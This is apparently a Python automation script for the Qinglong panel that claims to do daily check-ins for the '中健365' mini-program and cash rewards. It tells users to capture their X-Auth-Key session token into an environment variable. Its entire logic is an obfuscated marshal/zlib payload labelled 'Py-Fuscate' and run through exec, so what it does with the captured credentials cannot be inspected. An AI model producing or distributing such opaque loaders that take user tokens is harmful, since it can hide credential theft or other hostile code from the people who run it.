import requests,os,time,sys,datetime
from notify import send
'''
new Env("中健365")
每日签到领现金0.1-0.2，自动秒到到账微信
入口：#小程序://中健365达人/vacWkbjhWEe5mSl
抓包：https://dc.zhongjian365.com/域名里面的X-Auth-Key
变量名：zjck，多号换行
cron 0 12 * * *
v1.1 修复报错
'''

notify = True#关闭通知为False

version = sys.version.split(" ")
ver = version[0].split(".")
if int(ver[1]) != 10:
    print(f"你的青龙python版本为{sys.version},请使用py3.10运行此脚本")
try:
	import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(zlib.decompress(b'x\x9c\x01\x8d\x0br\xf4c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00sH\x00\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04d\x00d\x01l\x05Z\x05e\x06e\x00\xa0\x07e\x01\xa0\x08d\x02\xa1\x01\xa1\x01\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Ns\xa8\n\x00\x00\xfd7zXZ\x00\x00\x04\xe6\xd6\xb4F\x02\x00!\x01\x16\x00\x00\x00t/\xe5\xa3\xe0\nz\ng]\x001\x802\xa0hC"m;\xa5S\x08\\\xd8\xf7\x17\xa0\x87@\x96\xe0\xf8\xe5/9\xf0\xa2\x10\xfd\xbeM\xf9\x12\xa5\xc3\xaf\xd6\x9b\xa7\x98\x82\xb06\xb0Z\x1f@1\xabX\xf5\x9f\xe1\x91_\x94D:x\xb9\x84;n\x91&\x19J\x0e#\xc0\x07\xe2\xc4\x18+\xbd#D\xb8\x84\xde\x15\x05\x9a\xab\xc4N\xd1*F\x87v\xd5\xc9\xce\x18t\x83\x89+^\x1c\x1c\x9e\xa6\xb2\xf6\xfbE\x01\xb7N[\xad\xcf\xa5n\x87Z\x7fW8-\xe00\xe1\xe6\xfe\xbb\xd2\x0e\x1a\x86\xbd\x93~?\xde\xeb\x81S\xc1\xaa\x9fl\xed\xf9m\x93~\xef\x16\x0f\xfbV29\xf0<\xbaHr&\xd7\xa1\xb4XfG\xe1\xf1\x8a\xcf\xbe\xdbdN\xda\tj\xddqJ#\xd8\xac\xd4:\x053\xcd\xcd\x92\x82\xa8\xfd\x99+\x02\xf9\xee\xdc;\xf2c\x08\x0b;>R\x9a\xdb,\xb5n\x92\xbe\x01\xf8\xcf\x10\xcb\x0b\xd6\x12\xc5\xa6\xcb1K\xeb\x14\xe1r\xd8\xc6\xb2\xf6L\xc3\x0f\x86\x95\xd2\x84\xba\xa0\x07\x84M\xf6b\x14\x7fHe\xc191,\x98h\xad47\xb58\x0e\xd6i\xaf\x9a\xd4\x18\xd3_\x86\x96\xa8\xe2O\x92\xbe\x87\xe4\xfb\xea\xba\x9d\xa2\xca\xe6|\xc37i\x12\x0c\x9d\x92\xc3U6)E/6\xbbr\x05\xebKc(\xd1\x88\x9f\r\x93<\xef\x96\x05Bq\xaeL\x84\xd4J8\x8e\x9eJ\x8b\x82\x93\xea\xe41\x8eZg\x11XW.\xd5V\x04M*gp~LR\x85\xcf<\xd58\x1evi\xbb#\xd4Hi\xa8\xe7\x97\xd9SZU\xdc\x01u&\x15\xe4\x1a\xf6\x11\x02\xc5\x83-3\xfb&1\x12\xea\xed\xea}1\\\x97Q\xea&\xef\x9dhB\x98sw\x9c\xfe\x94L\x08\xcd\xad\x88\xdaY\xaby:\xd9\x16\xa9-\x02ZO}C\xc8\x89\xf5L|0\xaa\xe4\xe5/=xa\x91]t\xb8RU\x00\x07\x10\xb0\x9d\xf6\x88u\x0e;\x18\xb6\x04\xff0\xaf\xf2\x86\xcd \xdc\xce \xde\xdcU\xc2L\xceU\x99\xf7H\x8f\xf83~\xb8PC\xd9~p>\xf0\x13m=P\x0f.\x18\x99\x1f\x96\x8c\x19;Ey\rH*w\xf6\xbe\xb9\re\xe3\xaf\'D\x9f\xa2\xd5U\xd3\x84\xb6\x154?L\x15\x98\xce\xd0x:p\xe8Zyc\xaf\\\xd8\xae\xedE~_\xb3\xd0\xeb\nW\x8c\xbf\xba\x13e\xcf\x0e\x89\x03\xe8Y\xc7\xc1"\x83-\xa1\'\xd0V\xd6\x001\xd9\xf1\xb5D^\xe5\x01H\xcc\xcd\xd6\x99\x11\xba\xdbT\'UR\x1dqa\xe8\xc9\x99\x1bj|\xa0\x83\x1dv0\xb8AP\x05\x87\xaf\x97\'L\xe8\x01\xca\x19\xc7v\x01\xdcc`.\x01\xdd\x86A\xf0\xba0\xa0\xa7\x7fZ\xc8\xf4\xa5\xcc\x87\x05\xc6\xa9Q\xc4A\xb1FB\xf0,IKE\xcf\xc4p;\xec;\x80\x0b\x9c\xdf\xc8/\xdd6|\xec\xc1\xb7\xb8\x1bc\xbc\xa3cVpe\x9d\xdd\xb0\rA\x93\x00d\xc7\xfa\x073:2j\x16\xf2\xe1\xd8\x9b\xbbi\xf2\x1d\x9dAg\xcbDD\x10\xb8r\x8a\xc7\x83\x1c\xdb\xe9)\'_\xb5?\xe1\x91N#z\xa6<Y1\x15\xa6t\xd6\xeb\xa5K\x9d\x83R(a\xd0\x89\xcf3\xf6i\x80\xce\xce\xb6\x1a\x1e\xec\xdd\x1f\x8dI\x8d\xbe\xd6`\xfa\xafJ\xbe\x8c\x05\xbb\x84\x88\x87\x0en\xf2\r\xd4\xe4\xc6\ta\xc9p\xee\x08\x0c&l\'\xf0\r|\xa3?\\nM\x1d\x0f\x7f\xc1\xa7\x16\xab\xab\xce\x7fx}<i;\xe3\xf2\xbe\x1c\xd7A\xab\x9dD\xec)\x03l4\xba\xa1\xa9\xd4\xed\xb0:K\xe8\xc5\xb2\xfb\xc8\xd5a\xc1!\x8f\xd8w\x12W1\x1e\x0f [\xf5\xf3r\xb9\xb0\x10AV8\xa7\xfa\xb3\x83\x9eHl\x95\xb1\xd7<\x82^0\xe9\x9a\xaev\x7fQ\x02YV\x0c4\x95\x9b7vG%\xcf\x0c:\xb4J\xdc\xeb?\xcb\xa1\x9a\\\xd6o\xb1\x8b\xd1\xf8\x1c\'F\xe4\x13\xb1uFW|Z\xd7X\x08\xa80\x00t\xa19\xf8\xda\x0ct\xeb\xfd\xca?o\x93\xffd\xa6\xf5x\xc4\xa9\x1b;W\xc97?\xdd\x1a\x81\xda\xb5"I+k\x83\xbd\x9dNa\xd3\xcbn\xc1o\xa3\xa1\xd3\x94{v\x9cU\xa4\xca\x16\x19\x7f:\\\x04k\x9c6\xf4\xb8\xb3\x19\xbc\x98y\xa5\xd9\xbe\x96\xf2\xb2\x03\x14\x87p\xb3F\xb2\x13\xae\xeek\x94\xf5\x02\xbf\xf8p)b/\xfbK\xbe\xf5\xe6]:\xe6\xc4o\xe1v\x92\x96\xc7~\xc2;_s#]\'E\xf9Jqg0\xaa\xad\x1a\x89\xaa\xba\xb9\xaeO\x80\xb6)\x84\x15W\xc2hfE5z\x19"\xb9\xcf\xe6\xd8{\xe27QW\x05i/\xe2\xe8\xe4]\x0c\x88C2Q\xb7\xfa\xe8}\xa2\x1a\x13\xd7\x10\x0f\x9c\xf4\xbc:\x1b\'@&P\xb6\xf4\xc8U\x15ut\xdce\xe4\xd8\x06\xdd*o\xe2\x9dX\xf1X]\xae)\x99\xaf\x0cO:\xfcs\xd6\x8aV\x05B/\x974\xa2\xff\xach\x0e[\xda\xa7\xea\xed\x81\xfb)\xb6\x1a\x14\x9e^?\xfc\x96\xe0\xd3\xe0\'\x90\r{\xbe\xa7\x8f-\xb1\xd7W\x164\xb8l\xc6_\xe6\xdf\xe4\xb2#\xf6\x1ap\x9b|7F\xe9\x19\xfa\x0e\x1a\x97\xe4\xa9\xba\xd5c\x18\xfb?r\xe3o\x81\xad\xa91{\x89G\xaf\xc2\x16\xf8\xd7\xdd[\xd8\xb9\xa8\xc9\xbf\xd7w\xb8\x14\x91w\n`h%+i\xdeHvYr\x82\xe0\xca}\xc2[\x0fo\xec\x99h\xcc\xb5m:\x8dZT\xfd\xfcjNK\x1d-\x0bn\xf2\x88\xe2\xd14;\xf6\x907\xda\x1f\xf5K \xa3`9\x12[\xf5\xeb$\x80\x1bP\x0f\xba7\xd9\x8b\xec\xb8\xb1\xd9/\x08\x7f\xa6\xf3l:\xfb@\x91A\x08\x90\xbe\x19\x90\x8b\xb9\x10%\xcb\xc6.\xd3\t\x99Eq\xd1\x96\xeeX\xd9\xe5\'\x1dG>Qr\xf7\x03\x13\xd2,G\xca\xa8\xdd\x14\xe1\xe2q\x86\xf1\xc1\x99C0%\x8d\x03\xad\xdc\x9fj\xad\xe5\x03\x9f\x9f\x14\xf3m>\x94.\xbe\xa1p\xbdu\xa1\xc0K\xe3QY\x8eB\xb1\xb3\x12W$\xb5\xc23>\x19\x04S\xfc\xf6\x18\xc1\xf0\x14\xe9\xd6\xc5]\x84H)\xbf^\xbe*;\xb9\xeb\xa3\xa3\x8c\x7f\xf9\xe97\xd9\xb0r\xf1\xb0\xbb[\x95\xc1\x94k\xb1\xbe\xd3\xd1P\x07e\xc0\xf9d*\xa1\xca\x89#\x1a\x88\x01\xea\xca3\x15\x82\x0f\xcd\xaf\x1e\x1bLN\x82{[%\xc9_:\xe9Xs_"\xe7`\x87\xb2\xc07\xe1\x9c\n3\xef\xed\x15\xd0{\tI\xd0\xa4\xc3\xd0\xa2g\x7f\xd2\x11Ei\xbc\x16\x1c1)/\xc9^XM\xbdQ<\n\xdaK\x15\xb6\x13\x1dg\xcfV\x98\x8ejT\x01\xa4\xc8\xc2\x1f=={x2\x85\x8ag\xf9\xca\xaeU\xdc\xa41#\xb3\xafW\xad4*\x8a\x08\xb8\xb8\x96R\xa3\x0c\xacB\x91\x13\xd2\xcfA_J\xbdSq\xa2\x13\xee5\'\xdalQ\xcb\n\x0b\xe8o.b\x95\x0c\xd3LJ\xa0\xd3Sb\\\xe9\xb7\xf86\x16\xb9Dl)\xbc\xae\xbc\x9b<|\x9d\x83\xf7J\xd6\xe8\x14u\x1f\x88\xaf\x8dx\xef\xe1\x0e&\xeaD7\xd3\xb4n)\xa0\x7f$X\xc8\xb8\xf9\x19\xd3\xcf\x89\xa5Yi\x81C\x87\xef\x96\xd0\\\xcf\xd1\x1eb\xa1g\xc3J\x15\xdd\xf1\x0ew\xae\xa1|\xca\xd3H8\x14\xbbxy\xd3\xaa)\xd5\r\xf2&\xf0\x8b\\\x86\xa2\xc9\xd6:\xa6\xa8\xf1M\x96\x06\xf8M\xffS\x855\xa6U4\xf0\x82\x1c\x99|\xda\xb5U\xdc"G\xab\xe6\xc6\x9d%{\x9b\x02o)\xc9q\xea\xd3\xf5\xde\xe3\x80\xc9\xb4\x16\x9d\x91_\'\xc6\xc0\x80\x9cg\xd5\xbf\xf8CsX\x8a6f[\xa1\x045\x0e\x15dUv\x98\xfe]\xb4\xa8?/\x9e\xbab\xbb/\xbc\x9a\xeb\xca\xaai`\xb0\xa4!p\xe0\x05!\xe9p\x14Cv\xa3\xb4\xa1\xde\xecU\x9d\xf9\xb6\x02`\x08h\x10<\xd8ER\xc2KNH@\xe3,\x95\xee\xc6X\xfc\xad)OZ\xda\xa0\xff\x86.\x91\x08\xa4\xbb\x9d\x0b$\xd5n\xd6\x80`\x88\xf7\xc2\x91oL\xb2\xe4(Ke\x8f\xfc\xf4\x12\xa0\rY\xd4\xb4\xb6\x95\xbck\xe0TZC\xff\x15\x82K\xdd\xba\x10\xfb\x96\x05\x0c\x02\xc6Fr\xe5\xaf\x1d\xd8R\xd5\xbaP\x91B\xaf\x9aQ\xdb}\x97i/"\xebB\x1b\xf1q\x9f\xfa\xa2\x7f!\x06l:\xd6F*GU\x93\x0e7ddp\xd7?wp\xf8R-9\xc1\x1e\xc3\x04\x89\x14\x0e0s\x03mq\x04b&\x96\x93\x11\x94\x05\xab\x82\x03\xa2%Z\xce\x91&\x89\x96+\xf7\x8bm\x99\x8f\x0e\xfb\x95\x9bk\xc3)\xe8\xac0I\xfa\x01_\x93\xe0\xa6\xfc\\[\x91\x90\x9dtz\xc5/x\xd7\x94\xd8\x14\x1c\x86\x08,r\xd8_\xc6*5\x03\xe4\x06\xcdF\x08}\xc9`\x18\xb3w\x93\nL \xf4m\x94\xb4\x01\x8b\xfa]?\xfd2\xbc\xa4\xfa|t#\xaaU\xcd\xe1\xeb\x9a\x90\xaf\x11F?\x9e\xbb\xa5\xd0\x8b\x9d\x810\xfb\xdd\xc6\x91\xe0\xdf1\x854v\xe8\x17&\x19\x98\xdb\xb5\x8e\xed\xf6\x13V\xc7\xf1n\xbd9\x1dG\xaf\xe5\xab\xd3\xb0]\xa1\xb4Y\xf5\xd5\x88\xa9\xef\xdeG\x9fG\x8f\x94i\x13\x19\x0c\xe0\xd4\xb0\xd3\t\xd5l\xf4\x8d\xb1\xb1\xc7\xca\xf1j\x9an\xa0rjZ\x05\xd1K\xfaQ\xc9\xe2\x86\xe0\xb7{\x1d\xe2e\x9f`\xab5v\ro\xcb\xaa\x1e\xb9KL\xd5\x17b\xfe\xd7>\x0c \x9d\r\xc4\x86p\xce~\xc2j\xeb\xe7\xf99\xb7\x87\xe7\x0f\xd4\xea1\xf0\xc2\xa2\xdaXb\x15\xd7i&\xcd\xf3ws\xec\xa0\x86\x00\xc1h\xc49\x1e\xa6\x89\x10Gk\xc6A\x99\xd8\xfa\xb5\xc6Ax\xa0Q\xfc)\x0c6\xff\xe8\xfbE\x14\xe6\xc3\x9bd\xec>\xf8\x8b\xd0\n\x1aI\xe4\xa6\xcd_W}\x83}M\x0b\xa66\xc7H\xfa>\x05R\xf0\xb1\xf0\x18\xd6p\xde\x1c6I\xc1\x1c\x86\xc5\xcf\xc0\x0c9\xc7\xa0\x1d\xf3i3\x01\xa6\xab\xad\x11\xcf\x11\xa4;\\\x84e\x01\xbf\xe7\x87\x0eI\x90\xd4_\xc2\xa9\xd6U\x0b\x8b\xa7&\xe1\xf2\xa7T\xb5\x02a7\xb9\xc0\x85\xe5L\x17C\xfd+SZ\xac/\x17\x9c\xfa\xa1\xf2\x0f\x96\x17\xfc(~\xf2\xcb\x9d\x87^\x10KD\x0e\xa2q\xa5\x90`\xe0C\xf9Ib\xbe#\x01\xaf\xdbC\xbd\x87/@\xa6\x12\x8a\xf1/\xac\x07\x88\x95\xf68\x8fW\x85\x97K0j5\xb6\xd5\xbdL_\xe9\x04\xddh\x99~e\x13\xb1\x9b\x94\xef\xa6\xbf\xa1\x03\n\xb9\xd4\xe9\xcb-\x92\xaf\xad\xd9\xa5Imo\x97\x03\xe8!\xfbD\x84\x93\xb1\x92Q\xfa\xa1\xf9\xe0\xb0j{\x01]\xf9\xae\x15\x86\xd9\xf4\x87\xe29\x18\x8fL\xf4\xb0\xe1\x7f\xcc\x94\x17gF|\x9d\x1e\x80\xf7\xb9\xe8y\xfb\xfeX}k\xea\xf8F\x8e\xdd(\xd3\xcb\x02\xdcD;\xf6\xd9\x16\x93\xa3u\x12b!\x14\xd5D\x04\xb5\xcc\x16h\xa9\x13\xc0\x10\xa1$Et"$!eh0l\xd2\xf2\x96\xab\x86\'\xd2\xd2\xb9\xd0[\xba\x9b\xf8\x18\xb6&W\x89.;C\x90\xe61\x82\xbeaD|\xd5\x996\x89\x98\x0e\x9b\xe6/\x9ex\x92\x9e7\x12\xd3\xaf\x1d=\x11Vkj\xcd\x8e|\xc9\xe04\x00\x00\x00\x00k\xb5<\xcb\xb6\xce\xc1\x1e\x00\x01\x83\x15\xfb\x14\x00\x00S09\xb9\xb1\xc4g\xfb\x02\x00\x00\x00\x00\x04YZ)\t\xda\x07marshal\xda\x04lzma\xda\x04gzip\xda\x03bz2\xda\x08binascii\xda\x04zlib\xda\x04exec\xda\x05loads\xda\ndecompress\xa9\x00r\n\x00\x00\x00r\n\x00\x00\x00\xfa\nPy-Fuscate\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00H\x00\x16\x97\x7f\r')))
except KeyboardInterrupt:
	exit()
